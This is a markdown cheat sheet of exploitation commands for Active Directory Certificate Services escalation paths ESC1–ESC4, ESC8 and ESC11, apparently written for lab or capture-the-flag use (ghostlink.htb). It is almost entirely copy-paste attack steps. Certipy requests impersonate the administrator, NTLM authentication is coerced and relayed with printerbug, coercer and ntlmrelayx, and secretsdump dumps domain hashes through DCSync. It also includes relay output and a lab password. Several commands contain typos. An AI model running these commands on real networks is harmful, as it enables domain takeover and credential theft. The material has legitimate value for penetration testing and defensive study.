Highly Recommended Reference for ADCS attacks https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

### ESC1 
#### Exploitation
- Linux
    ```bash
    # Get the administrator SID
    certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read
    ```
    ```bash
    certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'VulnTemplate' \
        -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
    ```
    ```bash 
    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
    ```

### ESC2
#### Exploitation
- Linux
    ```bash
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'AnyPurposeCert'
    ``` 
    ```bash
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'User' \
        -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
    ```
    ```bash
    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'  
    ```

### ESC3 (Very similar to ESC2 in exploitation)
#### Exploitation
- Linux
    ```bash
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'EnrollAgent'
    ```
    ```bash 
    certipy req \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
        -ca 'CORP-CA' -template 'User' \
        -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
    ```
    ```bash    
    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
    ```
### ESC4
#### Exploitation
- Linux
    ```bash
    
    certipy template \
        -u 'attacker@corp.local' -p 'Passw0rd!' \
        -dc-ip '10.0.0.100' -template 'SecureFiles' \
        -write-default-configuration
    ```
    ```bash
    certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'SecureFiles' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
    ```
    ```bash
    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
    ```
    ```bash
    certipy template \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -template 'SecureFiles' \
    -write-configuration 'SecureFiles.json' -no-save
    ```

### ESC8
#### Exploitation
1. First set up the relay from our machine to the target http/https certsrv endpoint
    ```bash
    certipy relay  -target 'http://<target-ip>' -template 'DomainController'
    ```
2. Check available coersion methods using netexec smb `coerce_plus` module
    ```bash
    nxc smb taget.local -u 'myuser' -p 'passowrd123' -M coerce_plus
    ```
3. Coerce NTLM authentication to our Target machine (where we have the relay set up ready) - Ex. Using printerbug
    ```bash
    python3 /opt/AD/krbrelayx/printerbug.py 'target.local'/'myuser':'password123'@'<target-ip>' '<our-machine-ip>'
    ```
4. After this step, the relay should be getting us a .pfx for `dc0$`, we can then use it for Pass-the-certificate and get TGT
    ```bash
    certipy auth -pfx 'dc01$.pfx' -dc-ip 10.10.10.11
    ```
5. Lastly we can do DCSync using the NT Hash for the DC01$ account
    ```bash
    impacket-secretsdump 'target.local/dc01$@dc01.target.local' -hashes aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531  -no-pass -dc-ip 10.10.31.81
    ```


### ESC11
#### Exploitation
1. in this escalation we target RPC-Certificate Issuence instead of HTTP as in ESC11 Where Encryption is not enforced for ICPR (RPC) requests. we can verify it using Certipy `Encryption is not enforced for ICPR (RPC) requests` 
2. setup the relay to the target rpc endpoint for the Certificate Authority
    - Using ntlmrelyx
    ```bash
    impacket-ntlmrelayx -t rpc://172.16.20.10 -rpc-mode  ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' -      smb2support --template DomainController
    ```
3. Coerce the NTLM Authenticaiton using coercer
```bash
coercer coerce -l 10.10.17.47 -t ghostlink.htb  -d ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --always-continue
```
4. watch on the Ntlmrelay terminal and wait for a successfull certificate request for `DC01$`
```bash
[*] (SMB): Authenticating connection from GHOSTLINK/DC01$@10.129.30.203 against rpc://172.16.20.10 SUCCEED [1]
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Generating CSR...
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> CSR generated!
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Getting certificate...
[*] All targets processed!
[*] (SMB): Connection from 10.129.30.203 controlled, but there are no more targets left!
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Successfully requested certificate
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Request ID is 6
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
```
5. Now using the saved `DC01.pfx` we can use certipy to reqeust TGT or do UNPAC-the-Hash
```bash
certipy auth -pfx DC01.pfx -dc-ip 10.129.30.203
export KRB5CCNAGE=`pwd`/dc01.ccache

# dump ntds.dit (domain hashes)
secretsdump.py 'ghostlink.htb/DC01$@10.129.30.203' -hashes :<NT-HASH>
```
    
